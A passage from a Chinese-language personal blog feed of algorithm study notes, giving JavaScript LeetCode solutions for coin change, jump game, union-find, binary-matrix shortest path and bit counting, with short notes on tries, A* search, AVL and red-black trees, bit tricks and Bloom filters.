id="思路1-amp-题解-10"><a href="#思路1-amp-题解-10" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>DFS+贪心:（暂时没看懂）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> coinChange = <span class="function">(<span class="params">coins, amount</span>) =&gt;</span> &#123;</span><br><span class="line">    coins.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a);</span><br><span class="line">    <span class="keyword">let</span> res = <span class="literal">Infinity</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> find = <span class="function">(<span class="params">k, amount, count</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> coin = coins[k];</span><br><span class="line">      <span class="keyword">if</span> (k === coins.length - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (amount % coin === <span class="number">0</span>) &#123;</span><br><span class="line">          res = <span class="built_in">Math</span>.min(res, count + ~~(amount / coin));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = ~~(amount / coin); i &gt;= <span class="number">0</span> &amp;&amp; count + i &lt; res; i--) &#123; </span><br><span class="line">          find(k + <span class="number">1</span>, amount - coin * i, count + i);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  </span><br><span class="line">    find(<span class="number">0</span>, amount, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res === <span class="literal">Infinity</span> ? -<span class="number">1</span> : res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-9"><a href="#思路2-amp-题解-9" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>DP：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> coinChange = <span class="function"><span class="keyword">function</span>(<span class="params">coins, amount</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(amount + <span class="number">1</span>).fill(<span class="literal">Infinity</span>);</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= amount; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> coin <span class="keyword">of</span> coins) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">Math</span>.min(dp[i], dp[i - coin] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount] === <span class="literal">Infinity</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode55——跳跃游戏（☆☆）"><a href="#LeetCode55——跳跃游戏（☆☆）" class="headerlink" title="LeetCode55——跳跃游戏（☆☆）"></a>LeetCode55——跳跃游戏（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/jump-game/">跳转地址</a></p><h3 id="自己的代码-17"><a href="#自己的代码-17" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> length = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (length === <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(length).fill(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] === <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt;= nums[i]; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; length) &#123;</span><br><span class="line">                arr[i + j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!arr[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，永远存在小错误，头都大了。思路是将数组变成 true / false ，如果数组中存在 false 则返回 false。</p><h3 id="思路1-amp-题解-11"><a href="#思路1-amp-题解-11" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>贪心算法，从后往前贪。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nums) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> endReachable = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] + i &gt;= endReachable) &#123;</span><br><span class="line">            endReachable = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> endReachable === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 写法2</span></span><br><span class="line"><span class="keyword">var</span> canJump = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> max = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;nums.length;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (max &lt; i) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        max = <span class="built_in">Math</span>.max(i+nums[i], max);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode45——跳跃游戏II（☆☆）（★）"><a href="#LeetCode45——跳跃游戏II（☆☆）（★）" class="headerlink" title="LeetCode45——跳跃游戏II（☆☆）（★）"></a>LeetCode45——跳跃游戏II（☆☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/jump-game-ii/">跳转地址</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jump = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> end = <span class="number">0</span>; <span class="comment">// 当前跳跃所能到达的边界</span></span><br><span class="line">    <span class="keyword">let</span> steps = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">let</span> max = <span class="number">0</span>; <span class="comment">// 当前跳跃所有位置可达的最大距离</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">1</span>; i++) &#123; <span class="comment">// 最后一个位置不需要遍历，因为在此之前max肯定大于等于该位置的索引</span></span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, i + nums[i]); <span class="comment">// 更新当前跳跃中i位置可达的最大距离</span></span><br><span class="line">        <span class="keyword">if</span> (i === end) &#123; <span class="comment">// 已经到达边界，必须跳一下</span></span><br><span class="line">            end = max; <span class="comment">// 更新新的边界</span></span><br><span class="line">            steps++; <span class="comment">// 必须跳一下</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> steps;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="字典树（Trie-树）与并查集"><a href="#字典树（Trie-树）与并查集" class="headerlink" title="字典树（Trie 树）与并查集"></a>字典树（Trie 树）与并查集</h1><h2 id="基本性质"><a href="#基本性质" class="headerlink" title="基本性质"></a>基本性质</h2><ul><li>结点本身不存完整单词;</li><li>从根结点到某一结点，路径上经过的字符连接起来，为该结点对应的字符串;</li><li>每个结点的所有子结点路径代表的字符都不相同。 </li></ul><p><strong>结点的内部实现：</strong></p><p><img src="https://i.loli.net/2021/09/03/ZFHKTMRDui6WbQX.png" alt="image.png"></p><h2 id="LeetCode116——朋友圈（☆☆）"><a href="#LeetCode116——朋友圈（☆☆）" class="headerlink" title="LeetCode116——朋友圈（☆☆）"></a>LeetCode116——朋友圈（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/bLyHh0/">跳转地址</a></p><p>DFS 解法同 LC200 岛屿数量。</p><h3 id="思路-amp-题解-14"><a href="#思路-amp-题解-14" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p><strong>Union Find，并查集：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findCircleNum = <span class="function"><span class="keyword">function</span>(<span class="params">M</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> dsu = <span class="keyword">new</span> DSU(M.length);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; M.length; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; M[<span class="number">0</span>].length; col++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[row][col] === <span class="number">1</span>) &#123;</span><br><span class="line">                dsu.union(row, col);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Set</span>(M.map(<span class="function">(<span class="params">m, i</span>) =&gt;</span> dsu.find(i))).size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DSU</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">N</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent = [...new <span class="built_in">Array</span>(N).keys()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">find</span>(<span class="params">x</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.parent[x] !== x) &#123;</span><br><span class="line">            <span class="built_in">this</span>.parent[x] = <span class="built_in">this</span>.find(<span class="built_in">this</span>.parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parent[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">union</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent[<span class="built_in">this</span>.find(x)] = <span class="built_in">this</span>.find(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="A-search（启发式搜索）"><a href="#A-search（启发式搜索）" class="headerlink" title="A* search（启发式搜索）"></a>A* search（启发式搜索）</h1><h2 id="模板："><a href="#模板：" class="headerlink" title="模板："></a>模板：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def bfs(graph, start,end):</span><br><span class="line">  queue = []</span><br><span class="line">  queue.append([start])</span><br><span class="line">  visited.add(start)</span><br><span class="line"></span><br><span class="line">  while queue:</span><br><span class="line">    node = queue.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    queue.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="估价函数"><a href="#估价函数" class="headerlink" title="估价函数"></a>估价函数</h2><p>启发式函数: h(n), 它用来评价哪些结点最有希望的是个我们要找的结点，h(n) 会返回一个非负实数，也可以认为是从结点n的目标结点路径的估计成本。</p><p>启发式函数是一种告知搜索方向的方法。它提供了-种明智的方法来猜测哪个邻居结点会导向一个目标。</p><h2 id="LeetCode1091——二进制矩阵中的最短路径（☆☆）"><a href="#LeetCode1091——二进制矩阵中的最短路径（☆☆）" class="headerlink" title="LeetCode1091——二进制矩阵中的最短路径（☆☆）"></a>LeetCode1091——二进制矩阵中的最短路径（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/shortest-path-in-binary-matrix/">跳转地址</a></p><h3 id="思路-amp-题解-15"><a href="#思路-amp-题解-15" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>BFS:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shortestPathBinaryMatrix = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> n = grid.length;</span><br><span class="line">  <span class="keyword">if</span> (grid[<span class="number">0</span>][<span class="number">0</span>] || grid[n - <span class="number">1</span>][n - <span class="number">1</span>]) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) <span class="keyword">return</span> n;</span><br><span class="line">  <span class="keyword">const</span> queue = [];</span><br><span class="line">  queue.push([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">const</span> directions = [[-<span class="number">1</span>, -<span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, -<span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>]];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [i, j, d] <span class="keyword">of</span> queue) &#123;</span><br><span class="line">    <span class="comment">// 已经走到右下角</span></span><br><span class="line">    <span class="keyword">if</span> (i === n - <span class="number">1</span> &amp;&amp; j === n - <span class="number">1</span>) <span class="keyword">return</span> d;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> [x, y] <span class="keyword">of</span> directions)&#123;</span><br><span class="line">      <span class="keyword">const</span> newI = i + x, newJ = j + y;</span><br><span class="line">      <span class="keyword">if</span>(<span class="number">0</span> &lt;= newI &amp;&amp; newI &lt; n &amp;&amp; <span class="number">0</span> &lt;= newJ &amp;&amp; newJ &lt; n &amp;&amp; !grid[newI][newJ])&#123;</span><br><span class="line">        queue.push([newI, newJ, d + <span class="number">1</span>]);</span><br><span class="line">        grid[newI][newJ] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>启发式搜索好难（todo。。）</p><h1 id="AVL和红黑树"><a href="#AVL和红黑树" class="headerlink" title="AVL和红黑树"></a>AVL和红黑树</h1><p><img src="https://i.loli.net/2021/09/05/bFCEj642c9YBhuD.png" alt="image.png"></p><h2 id="AVL-总结"><a href="#AVL-总结" class="headerlink" title="AVL 总结"></a>AVL 总结</h2><ol><li>平衡二叉搜索树</li><li>每个结点存balance factor= {-1, 0, 1}</li><li>四种旋转操作</li></ol><p>不足：结点需要存储额外信息、且调整次数频繁</p><h2 id="Red-black-Tree"><a href="#Red-black-Tree" class="headerlink" title="Red-black Tree"></a>Red-black Tree</h2><p>红黑树是一种<strong>近似平衡</strong>的二叉搜索树(Binary SearchTree) ，它能够确保任何一个结点的左右子树的<strong>高度差小于两倍</strong>。具体来说，红黑树是满足如下条件的二叉搜索树：</p><ul><li>每个结点要么是红色，要么是黑色</li><li>根结点是黑色</li><li>每个叶结点（NIL结点， 空结点）是黑色的。</li><li>.不能有相邻接的两个红色结点</li><li>从任一结点到其每个叶子的所有路径都包含相同数目的黑色结点。</li></ul><h2 id="区别-1"><a href="#区别-1" class="headerlink" title="区别"></a>区别</h2><ul><li>AVLtrees provide <strong>faster lookups</strong> than Red Black Trees because they are <strong>more strictly balanced</strong>.</li><li>Red Black Trees provide <strong>faster insertion and removal</strong> operations than AVL trees as fewer rotations are done due to relatively relaxed balancing.</li><li>AVLtrees store balance <strong>factors or heights</strong> with eachnode, thus requires storage for an integer per nodewhereas Red Black Tree requires only 1 bit of information per node.</li><li>Red Black Trees are used in most of the <strong>language libraries like map, multimap, multisetin C++</strong> whereas AVL trees are used in <strong>databases</strong> where faster retrievals are required.</li></ul><h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><h2 id="指定位置的位运算"><a href="#指定位置的位运算" class="headerlink" title="指定位置的位运算"></a>指定位置的位运算</h2><ol><li>将 x 最右边的 n 位清零： <code>x &amp; (~0 &lt;&lt; n)</code> （~0 &lt;&lt; n 表示全1后面有 n 个0，再和 x 相与）</li><li>获取 x 的第 n 位值（0 或者 1）：<code>(x &gt;&gt; n) &amp; 1</code> （x &gt;&gt; n 表示 x 的第 n 位变成最后一位）</li><li>获取 x 的第 n 位的幂值： <code>x &amp; (1 &lt;&lt; (n-1))</code></li><li>仅将第 n 位置为1： <code>x | (1 &lt;&lt; n)</code></li><li>仅将第 n 位置为0：<code>x &amp; (~(1 &lt;&lt; n))</code></li><li>将 x 最高位至第 n 位（含）清零：<code>x &amp; ((1 &lt;&lt; n)-1)</code></li><li>将第 n 位至第 0 位（含）清零： <code>x &amp; (~((1 &lt;&lt; (n+1))-1))</code></li></ol><h2 id="实战位运算要点"><a href="#实战位运算要点" class="headerlink" title="实战位运算要点"></a>实战位运算要点</h2><ul><li><strong>判断奇偶：（建议以后都用位运算）</strong><br><code>x % 2 == 1 —&gt; (x &amp; 1) == 1</code><br><code>x % 2 == 0 —&gt; (x &amp; 1) == 0</code></li><li><code>x &gt;&gt; 1 —&gt; x/ 2</code><br>即：x=x/ 2; —&gt; x=x &gt;&gt; 1;<br>mid =(left +right)/2;—&gt; mid =(left + right) &gt;&gt; 1;</li><li><strong>清零最低位的1：（高频）</strong><code>X = X &amp;(X-1)</code> </li><li><strong>得到最低位的1：</strong><code>X &amp; -X</code></li><li><strong>得到0 ：</strong><code>X &amp; ~X</code> </li></ul><h2 id="LeetCode191——位1的个数（☆）"><a href="#LeetCode191——位1的个数（☆）" class="headerlink" title="LeetCode191——位1的个数（☆）"></a>LeetCode191——位1的个数（☆）</h2><p><a href="https://leetcode-cn.com/problems/number-of-1-bits/">跳转地址</a></p><ol><li>for loop：0 —&gt; 32 循环判断 “1”。</li><li>%2，/2 （32次）</li><li>&amp;1，x = x &gt;&gt; 1（32次）</li><li>while(x) { count++; x = x &amp; (x - 1);}（最佳）</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hammingWeight = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode190——颠倒二进制位（☆）"><a href="#LeetCode190——颠倒二进制位（☆）" class="headerlink" title="LeetCode190——颠倒二进制位（☆）"></a>LeetCode190——颠倒二进制位（☆）</h2><p><a href="https://leetcode-cn.com/problems/reverse-bits/">跳转地址</a></p><p>int —&gt; string —&gt; reverse —&gt; int 但是这样效率极低。</p><h3 id="思路1-amp-题解-12"><a href="#思路1-amp-题解-12" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>位运算：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseBits = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    res = (res &lt;&lt; <span class="number">1</span>) + (n &amp; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// n = n &gt;&gt; 1; </span></span><br><span class="line">    n = n &gt;&gt;&gt; <span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-10"><a href="#思路2-amp-题解-10" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>不用无符号位移：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseBits = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">0</span>, count = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">    result *= <span class="number">2</span>;</span><br><span class="line">    result += n &amp; <span class="number">1</span>;</span><br><span class="line">    n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode338——比特位计数（☆）"><a href="#LeetCode338——比特位计数（☆）" class="headerlink" title="LeetCode338——比特位计数（☆）"></a>LeetCode338——比特位计数（☆）</h2><p><a href="https://leetcode-cn.com/problems/counting-bits/">跳转地址</a></p><h3 id="自己的代码-18"><a href="#自己的代码-18" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countBits = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>, x = i;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      x = x &amp; (x - <span class="number">1</span>);</span><br><span class="line">      count++;</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(count);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路-amp-题解-16"><a href="#思路-amp-题解-16" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p><strong>动态规划+位运算：</strong>对于任一数 i，它二进制数中 1 的个数 = i 右移一位 的 1 的个数 + i 末位 1 的个数</p><p>用 dp[i] 表示 i 对应二进制数中 1 的个数，即 dp[i] = dp[i &gt;&gt; 1] + (i &amp; 1)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countBits = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dp = <span class="built_in">Array</span>(num+<span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span> ;i&lt; num+<span class="number">1</span>;i++)&#123;</span><br><span class="line">    dp[i] = dp[i&gt;&gt;<span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h1><h2 id="Bloom-Filter-Vs-Hash-Table"><a href="#Bloom-Filter-Vs-Hash-Table" class="headerlink" title="Bloom Filter Vs Hash Table"></a>Bloom Filter Vs Hash Table</h2><p>一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。</p><p><strong>优点：</strong>空间效率和查询时间都远远超过般的算法</p><p><strong>缺点：</strong>有一定的误识别率和删除困难。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/14/twAFeGEk9KUnRih.png&quot; alt=&quot;算法脑图副本.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序</summary>
      
    
    
    
    <category term="算法" scheme="https://asura1211.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://asura1211.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
